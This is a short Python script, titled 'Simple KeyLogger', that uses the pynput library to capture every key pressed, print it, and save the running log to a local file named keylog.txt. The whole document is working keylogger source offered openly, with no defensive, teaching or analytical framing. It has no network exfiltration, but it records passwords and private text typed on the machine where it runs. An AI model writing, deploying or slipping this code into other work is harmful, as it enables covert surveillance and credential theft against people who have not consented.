#Simple KeyLogger
#Records logs and keystrokes
#Save the keystrokes to a file


import pynput.keyboard
log = ""
def on_press(key):
    global log
    try:
        # Convert key to string for logging
        log = log + str(key.char)
    except AttributeError:
        # Handle special keys (e.g., 'Key.space', 'Key.enter')
        log = log + " " + str(key) + " "

    print(key)                

    with open("keylog.txt", "w") as f:
        f.write(log)

# Create a listener instance
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
